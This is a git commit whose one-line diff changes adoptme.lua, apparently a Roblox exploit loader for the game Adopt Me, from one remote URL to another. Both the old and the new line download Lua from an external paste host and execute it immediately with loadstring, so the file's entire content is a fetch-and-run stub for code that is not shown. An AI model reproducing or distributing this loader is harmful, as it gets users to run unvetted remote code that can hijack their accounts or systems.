777d965009b51c006b3021e1089ba4c752771f7a
Wisteriammy <avascarlet01@gmail.com>
2026-08-19 14:15:44 +0800

    Update adoptme.lua

--- adoptme.lua
+++ adoptme.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImVjNGZjNzA0LTQ0MDMtNGVhOC1iZDI3LTRhMWE3OTc2ODM4NyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Bhc3RlZnkuYXBwL1lHOE1tRHNYL3JhdyJ9fQ"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/DDSnkcycmZ/0"))()
